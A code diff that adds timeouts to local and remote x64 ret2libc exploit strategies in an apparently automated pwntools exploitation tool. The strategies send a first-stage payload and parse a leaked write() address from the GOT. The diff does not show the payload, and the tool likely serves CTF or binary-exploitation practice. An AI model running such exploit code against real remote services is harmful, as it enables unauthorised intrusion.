@@ -90,12 +90,17 @@ class Ret2LibcWriteX64LocalStrategy(ExploitStrategy):
             return False
 
         io = process(str(ctx.binary.path))
-        io.recv()
+        # v4.0.2c4: cap initial banner recv at 0.5s.
+        try:
+            io.recv(timeout=0.5)
+        except Exception:
+            pass
         io.sendline(payload1)
         print_payload("stage 1: leaking write address from GOT")
 
         try:
-            write_addr = u64(io.recv(8))
+            # v4.0.2c4: add timeout=2 to prevent indefinite hang.
+            write_addr = u64(io.recv(8, timeout=2))
         except Exception as e:
             print_info(f"ret2libc-write-x64 leak parse failed: {e}")
             return False
@@ -179,12 +184,17 @@ class Ret2LibcWriteX64RemoteStrategy(ExploitStrategy):
             return False
 
         io = remote(host, port)
-        io.recv()
+        # v4.0.2c4: cap initial banner recv at 0.5s.
+        try:
+            io.recv(timeout=0.5)
+        except Exception:
+            pass
         io.sendline(payload1)
         print_payload("stage 1: leaking write address from GOT")
 
         try:
-            write_addr = u64(io.recv(8))
+            # v4.0.2c4: add timeout=2 to prevent indefinite hang.
+            write_addr = u64(io.recv(8, timeout=2))
         except Exception as e:
             print_info(f"ret2libc-write-x64-remote leak parse failed: {e}")
             return False
